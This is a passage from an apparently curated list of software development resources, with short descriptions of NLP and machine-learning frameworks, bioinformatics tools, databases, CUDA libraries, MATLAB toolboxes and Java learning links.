languages. It also features neural network models for tagging, parsing, named entity recognition, text classification and more, multi-task learning with pretrained transformers like BERT. CoreNLP is a set of natural language analysis tools written in Java. CoreNLP enables users to derive linguistic annotations for text, including token and sentence boundaries, parts of speech, named entities, numeric and time values, dependency and constituency parses, coreference, sentiment, quote attributions, and relations. NLPnet is a Python library for Natural Language Processing tasks based on neural networks. It performs part-of-speech tagging, semantic role labeling and dependency parsing. Flair is a simple framework for state-of-the-art Natural Language Processing (NLP) models to your text, such as named entity recognition (NER), part-of-speech tagging (PoS), special support for biomedical data, sense disambiguation and classification, with support for a rapidly growing number of languages. Catalyst is a C# Natural Language Processing library built for speed. Inspired by spaCy's design, it brings pre-trained models, out-of-the box support for training word and document embeddings, and flexible entity recognition models. Apache OpenNLP is an open-source library for a machine learning based toolkit used in the processing of natural language text. It features an API for use cases like Named Entity Recognition, Sentence Detection, POS(Part-Of-Speech) tagging, Tokenization Feature extraction, Chunking, Parsing, and Coreference resolution. Microsoft Cognitive Toolkit (CNTK) is an open-source toolkit for commercial-grade distributed deep learning. It describes neural networks as a series of computational steps via a directed graph. CNTK allows the user to easily realize and combine popular model types such as feed-forward DNNs, convolutional neural networks (CNNs) and recurrent neural networks (RNNs/LSTMs). CNTK implements stochastic gradient descent (SGD, error backpropagation) learning with automatic differentiation and parallelization across multiple GPUs and servers. NVIDIA cuDNN is a GPU-accelerated library of primitives for deep neural networks. cuDNN provides highly tuned implementations for standard routines such as forward and backward convolution, pooling, normalization, and activation layers. cuDNN accelerates widely used deep learning frameworks, including Caffe2, Chainer, Keras, MATLAB, MxNet, PyTorch, and TensorFlow. TensorFlow is an end-to-end open source platform for machine learning. It has a comprehensive, flexible ecosystem of tools, libraries and community resources that lets researchers push the state-of-the-art in ML and developers easily build and deploy ML powered applications. Tensorflow_macOS is a Mac-optimized version of TensorFlow and TensorFlow Addons for macOS 11.0+ accelerated using Apple's ML Compute framework. Keras is a high-level neural networks API, written in Python and capable of running on top of TensorFlow, CNTK, or Theano.It was developed with a focus on enabling fast experimentation. It is capable of running on top of TensorFlow, Microsoft Cognitive Toolkit, R, Theano, or PlaidML. PyTorch is a library for deep learning on irregular input data such as graphs, point clouds, and manifolds. Primarily developed by Facebook's AI Research lab. Eclipse Deeplearning4J (DL4J) is a set of projects intended to support all the needs of a JVM-based(Scala, Kotlin, Clojure, and Groovy) deep learning application. This means starting with the raw data, loading and preprocessing it from wherever and whatever format it is in to building and tuning a wide variety of simple and complex deep learning networks. Chainer is a Python-based deep learning framework aiming at flexibility. It provides automatic differentiation APIs based on the define-by-run approach (dynamic computational graphs) as well as object-oriented high-level APIs to build and train neural networks. It also supports CUDA/cuDNN using CuPy for high performance training and inference. Anaconda is a very popular Data Science platform for machine learning and deep learning that enables users to develop models, train them, and deploy them. PlaidML is an advanced and portable tensor compiler for enabling deep learning on laptops, embedded devices, or other devices where the available computing hardware is not well supported or the available software stack contains unpalatable license restrictions. Scikit-Learn is a Python module for machine learning built on top of SciPy, NumPy, and matplotlib, making it easier to apply robust and simple implementations of many popular machine learning algorithms. Caffe is a deep learning framework made with expression, speed, and modularity in mind. It is developed by Berkeley AI Research (BAIR)/The Berkeley Vision and Learning Center (BVLC) and community contributors. Theano is a Python library that allows you to define, optimize, and evaluate mathematical expressions involving multi-dimensional arrays efficiently including tight integration with NumPy. Apache Spark is a unified analytics engine for large-scale data processing. It provides high-level APIs in Scala, Java, Python, and R, and an optimized engine that supports general computation graphs for data analysis. It also supports a rich set of higher-level tools including Spark SQL for SQL and DataFrames, MLlib for machine learning, GraphX for graph processing, and Structured Streaming for stream processing. Apache Spark Connector for SQL Server and Azure SQL is a high-performance connector that enables you to use transactional data in big data analytics and persists results for ad-hoc queries or reporting. The connector allows you to use any SQL database, on-premises or in the cloud, as an input data source or output data sink for Spark jobs. Apache PredictionIO is an open source machine learning framework for developers, data scientists, and end users. It supports event collection, deployment of algorithms, evaluation, querying predictive results via REST APIs. It is based on scalable open source services like Hadoop, HBase (and other DBs), Elasticsearch, Spark and implements what is called a Lambda Architecture. Apache Airflow is an open-source workflow management platform created by the community to programmatically author, schedule and monitor workflows. Airflow has a modular architecture and uses a message queue to orchestrate an arbitrary number of workers. Airflow is ready to scale to infinity. Open Neural Network Exchange(ONNX) is an open ecosystem that empowers AI developers to choose the right tools as their project evolves. ONNX provides an open source format for AI models, both deep learning and traditional ML. It defines an extensible computation graph model, as well as definitions of built-in operators and standard data types. BigDL is a distributed deep learning library for Apache Spark. With BigDL, users can write their deep learning applications as standard Spark programs, which can directly run on top of existing Spark or Hadoop clusters. Numba is an open source, NumPy-aware optimizing compiler for Python sponsored by Anaconda, Inc. It uses the LLVM compiler project to generate machine code from Python syntax. Numba can compile a large subset of numerically-focused Python, including many NumPy functions. Additionally, Numba has support for automatic parallelization of loops, generation of GPU-accelerated code, and creation of ufuncs and C callbacks. Bioinformatics Back to the Top     Bioinformatics Learning Resources Bioinformatics is a field of computational science that has to do with the analysis of sequences of biological molecules. This usually refers to genes, DNA, RNA, or protein, and is particularly useful in comparing genes and other sequences in proteins and other sequences within an organism or between organisms, looking at evolutionary relationships between organisms, and using the patterns that exist across DNA and protein sequences to figure out what their function is. European Bioinformatics Institute National Center for Biotechnology Information Online Courses in Bioinformatics |ISCB - International Society for Computational Biology Bioinformatics | Coursera Top Bioinformatics Courses | Udemy Biometrics Courses | Udemy Learn Bioinformatics with Online Courses and Lessons | edX Bioinformatics Graduate Certificate | Harvard Extension School Bioinformatics and Biostatistics | UC San Diego Extension Bioinformatics and Proteomics - Free Online Course Materials | MIT Introduction to Biometrics course - Biometrics Institute Bioinformatics Tools, Libraries, and Frameworks Bioconductor is an open source project that provides tools for the analysis and comprehension of high-throughput genomic data. Bioconductor uses the R statistical programming language, and is open source and open development. It has two releases each year, and an active user community. Bioconductor is also available as an AMI (Amazon Machine Image) and Docker images. Bioconda is a channel for the conda package manager specializing in bioinformatics software. It has a repository of packages containing over 7000 bioinformatics packages ready to use with conda install. UniProt is a freely accessible database that provide users with a comprehensive, high-quality and freely accessible set of protein sequences annotated with functional information. Bowtie 2 is an ultrafast and memory-efficient tool for aligning sequencing reads to long reference sequences. It is particularly good at aligning reads of about 50 up to 100s or 1,000s of characters, and particularly good at aligning to relatively long (mammalian) genomes. Biopython is a set of freely available tools for biological computation written in Python by an international team of developers. It is a distributed collaborative effort to develop Python libraries and applications which address the needs of current and future work in bioinformatics. BioRuby is a toolkit that has components for sequence analysis, pathway analysis, protein modelling and phylogenetic analysis; it supports many widely used data formats and provides easy access to databases, external programs and public web services, including BLAST, KEGG, GenBank, MEDLINE and GO. BioJava is a toolkit that provides an API to maintain local installations of the PDB, load and manipulate structures, perform standard analysis such as sequence and structure alignments and visualize them in 3D. BioPHP is an open source project that provides a collection of open source PHP code, with classes for DNA and protein sequence analysis, alignment, database parsing, and other bioinformatics tools. Avogadro is an advanced molecule editor and visualizer designed for cross-platform use in computational chemistry, molecular modeling, bioinformatics, materials science, and related areas. It offers flexible high quality rendering and a powerful plugin architecture. Ascalaph Designer is a program for molecular dynamic simulations. Under a single graphical environment are represented as their own implementation of molecular dynamics as well as the methods of classical and quantum mechanics of popular programs. Anduril is a workflow platform for analyzing large data sets. Anduril provides facilities for analyzing high-thoughput data in biomedical research, and the platform is fully extensible by third parties. Ready-made tools support data visualization, DNA/RNA/ChIP-sequencing, DNA/RNA microarrays, cytometry and image analysis. Galaxy is an open source, web-based platform for accessible, reproducible, and transparent computational biomedical research. It allows users without programming experience to easily specify parameters and run individual tools as well as larger workflows. It also captures run information so that any user can repeat and understand a complete computational analysis. PathVisio is a free open-source pathway analysis and drawing software which allows drawing, editing, and analyzing biological pathways. It is developed in Java and can be extended with plugins. Orange is a powerful data mining and machine learning toolkit that performs data analysis and visualization. Basic Local Alignment Search Tool is a tool that finds regions of similarity between biological sequences. The program compares nucleotide or protein sequences to sequence databases and calculates the statistical significance. OSIRIS is public-domain, free, and open source STR analysis software designed for clinical, forensic, and research use, and has been validated for use as an expert system for single-source samples. NCBI BioSystems is a  Database that provides integrated access to biological systems and their component genes, proteins, and small molecules, as well as literature describing those biosystems and other related data throughout Entrez. Databases Back to the Top         SQL/NoSQL Learning Resources SQL is a standard language for storing, manipulating and retrieving data in relational databases. NoSQL is a database that is interchangeably referred to as ""nonrelational, or ""non-SQL"" to highlight that the database can handle huge volumes of rapidly changing, unstructured data in different ways than a relational (SQL-based) database with rows and tables. Transact-SQL(T-SQL) is a Microsoft extension of SQL with all of the tools and applications communicating to a SQL database by sending T-SQL commands. Introduction to Transact-SQL SQL Tutorial by W3Schools Learn SQL Skills Online from Coursera SQL Courses Online from Udemy SQL Online Training Courses from LinkedIn Learning Learn SQL For Free from Codecademy GitLab's SQL Style Guide OracleDB SQL Style Guide Basics Tableau CRM: BI Software and Tools Databases on AWS Best Practices and Recommendations for SQL Server Clustering in AWS EC2. Connecting from Google Kubernetes Engine to a Cloud SQL instance. Educational Microsoft Azure SQL resources MySQL Certifications SQL vs. NoSQL Databases: What's the Difference? What is NoSQL? SQL/NoSQL Tools and Databases Netdata is high-fidelity infrastructure monitoring and troubleshooting, real-time monitoring Agent collects thousands of metrics from systems, hardware, containers, and applications with zero configuration. It runs permanently on all your physical/virtual servers, containers, cloud deployments, and edge/IoT devices, and is perfectly safe to install on your systems mid-incident without any preparation. Azure Data Studio is an open source data management tool that enables working with SQL Server, Azure SQL DB and SQL DW from Windows, macOS and Linux. Azure SQL Database  is the intelligent, scalable, relational database service built for the cloud. It’s evergreen and always up to date, with AI-powered and automated features that optimize performance and durability for you. Serverless compute and Hyperscale storage options automatically scale resources on demand, so you can focus on building new applications without worrying about storage size or resource management. Azure SQL Managed Instance is a fully managed SQL Server Database engine instance that's hosted in Azure and placed in your network. This deployment model makes it easy to lift and shift your on-premises applications to the cloud with very few application and database changes. Managed instance has split compute and storage components. Azure Synapse Analytics is a limitless analytics service that brings together enterprise data warehousing and Big Data analytics. It gives you the freedom to query data on your terms, using either serverless or provisioned resources at scale. It brings together the best of the SQL technologies used in enterprise data warehousing, Spark technologies used in big data analytics, and Pipelines for data integration and ETL/ELT. MSSQL for Visual Studio Code is an extension for developing Microsoft SQL Server, Azure SQL Database and SQL Data Warehouse everywhere with a rich set of functionalities. SQL Server Data Tools (SSDT) is a development tool for building SQL Server relational databases, Azure SQL Databases, Analysis Services (AS) data models, Integration Services (IS) packages, and Reporting Services (RS) reports. With SSDT, a developer can design and deploy any SQL Server content type with the same ease as they would develop an application in Visual Studio or Visual Studio Code. Bulk Copy Program is a command-line tool that comes with Microsoft SQL Server. BCP, allows you to import and export large amounts of data in and out of SQL Server databases quickly snd efficeiently. SQL Server Migration Assistant is a tool from Microsoft that simplifies database migration process from Oracle to SQL Server, Azure SQL Database, Azure SQL Database Managed Instance and Azure SQL Data Warehouse. SQL Server Integration Services is a development platform for building enterprise-level data integration and data transformations solutions. Use Integration Services to solve complex business problems by copying or downloading files, loading data warehouses, cleansing and mining data, and managing SQL Server objects and data. SQL Server Business Intelligence(BI) is a collection of tools in Microsoft's SQL Server for transforming raw data into information businesses can use to make decisions. Tableau is a Data Visualization software used in relational databases, cloud databases, and spreadsheets. Tableau was acquired by Salesforce in August 2019. DataGrip is a professional DataBase IDE developed by Jet Brains that provides context-sensitive code completion, helping you to write SQL code faster. Completion is aware of the tables structure, foreign keys, and even database objects created in code you're editing. RStudio is an integrated development environment for R and Python, with a console, syntax-highlighting editor that supports direct code execution, and tools for plotting, history, debugging and workspace management. MySQL is a fully managed database service to deploy cloud-native applications using the world's most popular open source database. PostgreSQL is a powerful, open source object-relational database system with over 30 years of active development that has earned it a strong reputation for reliability, feature robustness, and performance. Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It is a fully managed, multiregion, multimaster, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. Apache Cassandra™ is an open source NoSQL distributed database trusted by thousands of companies for scalability and high availability without compromising performance. Cassandra provides linear scalability and proven fault-tolerance on commodity hardware or cloud infrastructure make it the perfect platform for mission-critical data. Apache HBase™ is an open-source, NoSQL, distributed big data store. It enables random, strictly consistent, real-time access to petabytes of data. HBase is very effective for handling large, sparse datasets. HBase serves as a direct input and output to the Apache MapReduce framework for Hadoop, and works with Apache Phoenix to enable SQL-like queries over HBase tables. Hadoop Distributed File System (HDFS) is a distributed file system that handles large data sets running on commodity hardware. It is used to scale a single Apache Hadoop cluster to hundreds (and even thousands) of nodes. HDFS is one of the major components of Apache Hadoop, the others being MapReduce and YARN. Apache Mesos is a cluster manager that provides efficient resource isolation and sharing across distributed applications, or frameworks. It can run Hadoop, Jenkins, Spark, Aurora, and other frameworks on a dynamically shared pool of nodes. Apache Spark is a unified analytics engine for big data processing, with built-in modules for streaming, SQL, machine learning and graph processing. ElasticSearch is a search engine based on the Lucene library. It provides a distributed, multitenant-capable full-text search engine with an HTTP web interface and schema-free JSON documents. Elasticsearch is developed in Java. Logstash is a tool for managing events and logs. When used generically, the term encompasses a larger system of log collection, processing, storage and searching activities. Kibana is an open source data visualization plugin for Elasticsearch. It provides visualization capabilities on top of the content indexed on an Elasticsearch cluster. Users can create bar, line and scatter plots, or pie charts and maps on top of large volumes of data. Trino is a Distributed SQL query engine for big data. It is able to tremendously speed up ETL processes, allow them all to use standard SQL statement, and work with numerous data sources and targets all in the same system. Extract, transform, and load (ETL) is a data pipeline used to collect data from various sources, transform the data according to business rules, and load it into a destination data store. Redis(REmote DIctionary Server) is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker. It provides data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes, and streams. FoundationDB is an open source distributed database designed to handle large volumes of structured data across clusters of commodity servers. It organizes data as an ordered key-value store and employs ACID transactions for all operations. It is especially well-suited for read/write workloads but also has excellent performance for write-intensive workloads. FoundationDB was acquired by Apple in 2015. IBM DB2 is a collection of hybrid data management products offering a complete suite of AI-empowered capabilities designed to help you manage both structured and unstructured data on premises as well as in private and public cloud environments. Db2 is built on an intelligent common SQL engine designed for scalability and flexibility. MongoDB is a document database meaning it stores data in JSON-like documents. OracleDB is a powerful fully managed database helps developers manage business-critical data with the highest availability, reliability, and security. MariaDB is an enterprise open source database solution for modern, mission-critical applications. SQLite is a C-language library that implements a small, fast, self-contained, high-reliability, full-featured, SQL database engine.SQLite is the most used database engine in the world. SQLite is built into all mobile phones and most computers and comes bundled inside countless other applications that people use every day. SQLite Database Browser is an open source SQL tool that allows users to create, design and edits SQLite database files. It lets users show a log of all the SQL commands that have been issued by them and by the application itself. InfluxDB is an open source time series platform.  This includes APIs for storing and querying data, processing it in the background for ETL or monitoring and alerting purposes, user dashboards, Internet of Things sensor data, and visualizing and exploring the data and more. It also has support for processing data from Graphite. Atlas is an in-memory dimensional time series database. CouchbaseDB is an open source distributed multi-model NoSQL document-oriented database. It creates a key-value store with managed cache for sub-millisecond data operations, with purpose-built indexers for efficient queries and a powerful query engine for executing SQL queries. dbWatch is a complete database monitoring/management solution for SQL Server, Oracle, PostgreSQL, Sybase, MySQL and Azure. Designed for proactive management and automation of routine maintenance in large scale on-premise, hybrid/cloud database environments. Cosmos DB Profiler is a real-time visual debugger allowing a development team to gain valuable insight and perspective into their usage of Cosmos DB database. It identifies over a dozen suspicious behaviors from your application’s interaction with Cosmos DB. Adminer is an SQL management client tool for managing databases, tables, relations, indexes, users. Adminer has support for all the popular database management systems such as MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB. DBeaver is an open source database tool for developers and database administrators. It offers supports for JDBC compliant databases such as MySQL, Oracle, IBM DB2, SQL Server, Firebird, SQLite, Sybase, Teradata, Firebird, Apache Hive, Phoenix, and Presto. DbVisualizer is a SQL management tool that allows users to manage a wide range of databases such as Oracle, Sybase, SQL Server, MySQL, H3, and SQLite. AppDynamics Database is a management product for Microsoft SQL Server. With AppDynamics you can monitor and trend key performance metrics such as resource consumption, database objects, schema statistics and more, allowing you to proactively tune and fix issues in a High-Volume Production Environment. Toad is a SQL Server DBMS toolset developed by Quest. It increases productivity by using extensive automation, intuitive workflows, and built-in expertise. This SQL management tool resolve issues, manage change and promote the highest levels of code quality for both relational and non-relational databases. Lepide SQL Server is an open source storage manager utility to analyse the performance of SQL Servers. It provides a complete overview of all configuration and permission changes being made to your SQL Server environment through an easy-to-use, graphical user interface. Sequel Pro is a fast MacOS database management tool for working with MySQL. This SQL management tool helpful for interacting with your database by easily to adding new databases, new tables, and new rows. CUDA Development Back to the Top         CUDA Toolkit. Source: NVIDIA Developer CUDA CUDA Learning Resources CUDA is a parallel computing platform and programming model developed by NVIDIA for general computing on graphical processing units (GPUs). With CUDA, developers are able to dramatically speed up computing applications by harnessing the power of GPUs. In GPU-accelerated applications, the sequential part of the workload runs on the CPU, which is optimized for single-threaded. The compute intensive portion of the application runs on thousands of GPU cores in parallel. When using CUDA, developers can program in popular languages such as C, C++, Fortran, Python and MATLAB. CUDA Toolkit Documentation CUDA Quick Start Guide CUDA on WSL CUDA GPU support for TensorFlow NVIDIA Deep Learning cuDNN Documentation NVIDIA GPU Cloud Documentation NVIDIA NGC is a hub for GPU-optimized software for deep learning, machine learning, and high-performance computing (HPC) workloads. NVIDIA NGC Containers is a registry that provides researchers, data scientists, and developers with simple access to a comprehensive catalog of GPU-accelerated software for AI, machine learning and HPC. These containers take full advantage of NVIDIA GPUs on-premises and in the cloud. CUDA Tools Libraries, and Frameworks CUDA Toolkit is a collection of tools & libraries that provide a development environment for creating high performance GPU-accelerated applications. The CUDA Toolkit allows you can develop, optimize, and deploy your applications on GPU-accelerated embedded systems, desktop workstations, enterprise data centers, cloud-based platforms and HPC supercomputers. The toolkit includes GPU-accelerated libraries, debugging and optimization tools, a C/C++ compiler, and a runtime library to build and deploy your application on major architectures including x86, Arm and POWER. NVIDIA cuDNN is a GPU-accelerated library of primitives for deep neural networks. cuDNN provides highly tuned implementations for standard routines such as forward and backward convolution, pooling, normalization, and activation layers. cuDNN accelerates widely used deep learning frameworks, including Caffe2, Chainer, Keras, MATLAB, MxNet, PyTorch, and TensorFlow. CUDA-X HPC is a collection of libraries, tools, compilers and APIs that help developers solve the world's most challenging problems. CUDA-X HPC includes highly tuned kernels essential for high-performance computing (HPC). NVIDIA Container Toolkit is a collection of tools & libraries that allows users to build and run GPU accelerated Docker containers. The toolkit includes a container runtime library and utilities to automatically configure containers to leverage NVIDIA GPUs. Minkowski Engine is an auto-differentiation library for sparse tensors. It supports all standard neural network layers such as convolution, pooling, unpooling, and broadcasting operations for sparse tensors. CUTLASS is a collection of CUDA C++ template abstractions for implementing high-performance matrix-multiplication (GEMM) at all levels and scales within CUDA. It incorporates strategies for hierarchical decomposition and data movement similar to those used to implement cuBLAS. CUB is a cooperative primitives for CUDA C++ kernel authors. Tensorman is a utility for easy management of Tensorflow containers by developed by System76.Tensorman allows Tensorflow to operate in an isolated environment that is contained from the rest of the system. This virtual environment can operate independent of the base system, allowing you to use any version of Tensorflow on any version of a Linux distribution that supports the Docker runtime. Numba is an open source, NumPy-aware optimizing compiler for Python sponsored by Anaconda, Inc. It uses the LLVM compiler project to generate machine code from Python syntax. Numba can compile a large subset of numerically-focused Python, including many NumPy functions. Additionally, Numba has support for automatic parallelization of loops, generation of GPU-accelerated code, and creation of ufuncs and C callbacks. Chainer is a Python-based deep learning framework aiming at flexibility. It provides automatic differentiation APIs based on the define-by-run approach (dynamic computational graphs) as well as object-oriented high-level APIs to build and train neural networks. It also supports CUDA/cuDNN using CuPy for high performance training and inference. CuPy is an implementation of NumPy-compatible multi-dimensional array on CUDA. CuPy consists of the core multi-dimensional array class, cupy.ndarray, and many functions on it. It supports a subset of numpy.ndarray interface. CatBoost is a fast, scalable, high performance Gradient Boosting on Decision Trees library, used for ranking, classification, regression and other machine learning tasks for Python, R, Java, C++. Supports computation on CPU and GPU. cuDF is a GPU DataFrame library for loading, joining, aggregating, filtering, and otherwise manipulating data. cuDF provides a pandas-like API that will be familiar to data engineers & data scientists, so they can use it to easily accelerate their workflows without going into the details of CUDA programming. cuML is a suite of libraries that implement machine learning algorithms and mathematical primitives functions that share compatible APIs with other RAPIDS projects. cuML enables data scientists, researchers, and software engineers to run traditional tabular ML tasks on GPUs without going into the details of CUDA programming. In most cases, cuML's Python API matches the API from scikit-learn. ArrayFire is a general-purpose library that simplifies the process of developing software that targets parallel and massively-parallel architectures including CPUs, GPUs, and other hardware acceleration devices. Thrust is a C++ parallel programming library which resembles the C++ Standard Library. Thrust's high-level interface greatly enhances programmer productivity while enabling performance portability between GPUs and multicore CPUs. AresDB is a GPU-powered real-time analytics storage and query engine. It features low query latency, high data freshness and highly efficient in-memory and on disk storage management. Arraymancer is a tensor (N-dimensional array) project in Nim. The main focus is providing a fast and ergonomic CPU, Cuda and OpenCL ndarray library on which to build a scientific computing ecosystem. Kintinuous is a real-time dense visual SLAM system capable of producing high quality globally consistent point and mesh reconstructions over hundreds of metres in real-time with only a low-cost commodity RGB-D sensor. GraphVite is a general graph embedding engine, dedicated to high-speed and large-scale embedding learning in various applications. MATLAB Development Back to the Top     MATLAB Learning Resources MATLAB is a programming language that does numerical computing such as expressing matrix and array mathematics directly. MATLAB Documentation Getting Started with MATLAB  MATLAB and Simulink Training from MATLAB Academy MathWorks Certification Program Apache Spark Basics | MATLAB & Simulink MATLAB Hadoop and Spark | MATLAB & Simulink MATLAB Online Courses from Udemy MATLAB Online Courses from Coursera MATLAB Online Courses from edX Building a MATLAB GUI MATLAB Style Guidelines 2.0 Setting Up Git Source Control with MATLAB & Simulink Pull, Push and Fetch Files with Git with MATLAB & Simulink Create New Repository with MATLAB & Simulink PRMLT is Matlab code for machine learning algorithms in the PRML book. MATLAB Tools, Libraries, Frameworks MATLAB and Simulink Services & Applications List MATLAB in the Cloud is a service that allows you to run in cloud environments from MathWorks Cloud to Public Clouds including AWS and Azure. MATLAB Online™ is a service that allows to users to uilitize MATLAB and Simulink through a web browser such as Google Chrome. Simulink is a block diagram environment for Model-Based Design. It supports simulation, automatic code generation, and continuous testing of embedded systems. Simulink Online™ is a service that provides access to Simulink through your web browser. MATLAB Drive™ is a service that gives you the ability to store, access, and work with your files from anywhere. MATLAB Parallel Server™ is a tool that lets you scale MATLAB® programs and Simulink® simulations to clusters and clouds. You can prototype your programs and simulations on the desktop and then run them on clusters and clouds without recoding. MATLAB Parallel Server supports batch jobs, interactive parallel computations, and distributed computations with large matrices. MATLAB Schemer is a MATLAB package makes it easy to change the color scheme (theme) of the MATLAB display and GUI. LRSLibrary is a Low-Rank and Sparse Tools for Background Modeling and Subtraction in Videos. The library was designed for moving object detection in videos, but it can be also used for other computer vision and machine learning problems. Image Processing Toolbox™ is a tool that provides a comprehensive set of reference-standard algorithms and workflow apps for image processing, analysis, visualization, and algorithm development. You can perform image segmentation, image enhancement, noise reduction, geometric transformations, image registration, and 3D image processing. Computer Vision Toolbox™ is a tool that provides algorithms, functions, and apps for designing and testing computer vision, 3D vision, and video processing systems. You can perform object detection and tracking, as well as feature detection, extraction, and matching. You can automate calibration workflows for single, stereo, and fisheye cameras. For 3D vision, the toolbox supports visual and point cloud SLAM, stereo vision, structure from motion, and point cloud processing. Statistics and Machine Learning Toolbox™ is a tool that provides functions and apps to describe, analyze, and model data. You can use descriptive statistics, visualizations, and clustering for exploratory data analysis; fit probability distributions to data; generate random numbers for Monte Carlo simulations, and perform hypothesis tests. Regression and classification algorithms let you draw inferences from data and build predictive models either interactively, using the Classification and Regression Learner apps, or programmatically, using AutoML. Lidar Toolbox™ is a tool that provides algorithms, functions, and apps for designing, analyzing, and testing lidar processing systems. You can perform object detection and tracking, semantic segmentation, shape fitting, lidar registration, and obstacle detection. Lidar Toolbox supports lidar-camera cross calibration for workflows that combine computer vision and lidar processing. Mapping Toolbox™ is a tool that provides algorithms and functions for transforming geographic data and creating map displays. You can visualize your data in a geographic context, build map displays from more than 60 map projections, and transform data from a variety of sources into a consistent geographic coordinate system. UAV Toolbox is an application that provides tools and reference applications for designing, simulating, testing, and deploying unmanned aerial vehicle (UAV) and drone applications. You can design autonomous flight algorithms, UAV missions, and flight controllers. The Flight Log Analyzer app lets you interactively analyze 3D flight paths, telemetry information, and sensor readings from common flight log formats. Parallel Computing Toolbox™ is a tool that lets you solve computationally and data-intensive problems using multicore processors, GPUs, and computer clusters. High-level constructs such as parallel for-loops, special array types, and parallelized numerical algorithms enable you to parallelize MATLAB® applications without CUDA or MPI programming. The toolbox lets you use parallel-enabled functions in MATLAB and other toolboxes. You can use the toolbox with Simulink® to run multiple simulations of a model in parallel. Programs and models can run in both interactive and batch modes. Partial Differential Equation Toolbox™ is a tool that provides functions for solving structural mechanics, heat transfer, and general partial differential equations (PDEs) using finite element analysis. ROS Toolbox is a tool that provides an interface connecting MATLAB® and Simulink® with the Robot Operating System (ROS and ROS 2), enabling you to create a network of ROS nodes. The toolbox includes MATLAB functions and Simulink blocks to import, analyze, and play back ROS data recorded in rosbag files. You can also connect to a live ROS network to access ROS messages. Robotics Toolbox™ provides a toolbox that brings robotics specific functionality(designing, simulating, and testing manipulators, mobile robots, and humanoid robots) to MATLAB, exploiting the native capabilities of MATLAB (linear algebra, portability, graphics). The toolbox also supports mobile robots with functions for robot motion models (bicycle), path planning algorithms (bug, distance transform, D*, PRM), kinodynamic planning (lattice, RRT), localization (EKF, particle filter), map building (EKF) and simultaneous localization and mapping (EKF), and a Simulink model a of non-holonomic vehicle. The Toolbox also including a detailed Simulink model for a quadrotor flying robot. Deep Learning Toolbox™ is a tool that provides a framework for designing and implementing deep neural networks with algorithms, pretrained models, and apps. You can use convolutional neural networks (ConvNets, CNNs) and long short-term memory (LSTM) networks to perform classification and regression on image, time-series, and text data. You can build network architectures such as generative adversarial networks (GANs) and Siamese networks using automatic differentiation, custom training loops, and shared weights. With the Deep Network Designer app, you can design, analyze, and train networks graphically. It can exchange models with TensorFlow™ and PyTorch through the ONNX format and import models from TensorFlow-Keras and Caffe. The toolbox supports transfer learning with DarkNet-53, ResNet-50, NASNet, SqueezeNet and many other pretrained models. Reinforcement Learning Toolbox™ is a tool that provides an app, functions, and a Simulink® block for training policies using reinforcement learning algorithms, including DQN, PPO, SAC, and DDPG. You can use these policies to implement controllers and decision-making algorithms for complex applications such as resource allocation, robotics, and autonomous systems. Deep Learning HDL Toolbox™ is a tool that provides functions and tools to prototype and implement deep learning networks on FPGAs and SoCs. It provides pre-built bitstreams for running a variety of deep learning networks on supported Xilinx® and Intel® FPGA and SoC devices. Profiling and estimation tools let you customize a deep learning network by exploring design, performance, and resource utilization tradeoffs. Model Predictive Control Toolbox™ is a tool that provides functions, an app, and Simulink® blocks for designing and simulating controllers using linear and nonlinear model predictive control (MPC). The toolbox lets you specify plant and disturbance models, horizons, constraints, and weights. By running closed-loop simulations, you can evaluate controller performance. Vision HDL Toolbox™ is a tool that provides pixel-streaming algorithms for the design and implementation of vision systems on FPGAs and ASICs. It provides a design framework that supports a diverse set of interface types, frame sizes, and frame rates. The image processing, video, and computer vision algorithms in the toolbox use an architecture appropriate for HDL implementations. SoC Blockset™ is a tool that provides Simulink® blocks and visualization tools for modeling, simulating, and analyzing hardware and software architectures for ASICs, FPGAs, and systems on a chip (SoC). You can build your system architecture using memory models, bus models, and I/O models, and simulate the architecture together with the algorithms. Wireless HDL Toolbox™ is a tool that provides pre-verified, hardware-ready Simulink® blocks and subsystems for developing 5G, LTE, and custom OFDM-based wireless communication applications. It includes reference applications, IP blocks, and gateways between frame and sample-based processing. ThingSpeak™ is an IoT analytics service that allows you to aggregate, visualize, and analyze live data streams in the cloud. ThingSpeak provides instant visualizations of data posted by your devices to ThingSpeak. With the ability to execute MATLAB® code in ThingSpeak, you can perform online analysis and process data as it comes in. ThingSpeak is often used for prototyping and proof-of-concept IoT systems that require analytics. SEA-MAT is a collaborative effort to organize and distribute Matlab tools for the Oceanographic Community. Gramm is a complete data visualization toolbox for Matlab. It provides an easy to use and high-level interface to produce publication-quality plots of complex data with varied statistical visualizations. Gramm is inspired by R's ggplot2 library. hctsa is a software package for running highly comparative time-series analysis using Matlab. Plotly is a Graphing Library for MATLAB. YALMIP is a MATLAB toolbox for optimization modeling. GNU Octave is a high-level interpreted language, primarily intended for numerical computations. It provides capabilities for the numerical solution of linear and nonlinear problems, and for performing other numerical experiments. It also provides extensive graphics capabilities for data visualization and manipulation. Java Development Back to the Top     Java Learning Resources Java is a popular programming language and development platform(JDK). It reduces costs, shortens development timeframes, drives innovation, and improves application services. With millions of developers running more than 51 billion Java Virtual Machines worldwide. The Eclipse Foundation is home to a worldwide community of developers, the Eclipse IDE, Jakarta EE and over 375 open source projects, including runtimes, tools and frameworks for Java and other languages. Getting Started with Java Oracle Java certifications from Oracle University Google Developers Training Google Developers Certification Java Tutorial by W3Schools Building Your First Android App in Java Getting Started with Java in Visual Studio Code Google Java Style Guide AOSP Java Code Style for Contributors Chromium Java style guide Get Started with OR-Tools for Java Getting started with Java Tool Installer task for Azure Pipelines Gradle User Manual Java Tools, Libraries, and Frameworks Java SE contains several tools to assist in program development and debugging, and in the monitoring and troubleshooting of production applications. JDK Development Tools includes the Java Web Start Tools (javaws) Java Troubleshooting, Profiling, Monitoring and Management Tools (jcmd, jconsole, jmc, jvisualvm); and Java Web Services Tools (schemagen, wsgen, wsimport, xjc). Android Studio is the official integrated development environment for Google's Android operating system, built on JetBrains' IntelliJ IDEA software and designed specifically for Android development. Availble on Windows, macOS, Linux, Chrome OS. IntelliJ IDEA is an IDE for Java, but it also understands and provides intelligent coding assistance for a large variety of other languages such as Kotlin, SQL, JPQL, HTML, JavaScript, etc., even if the language expression is injected into a String literal in your Java code. NetBeans is an IDE provides Java developers with all the 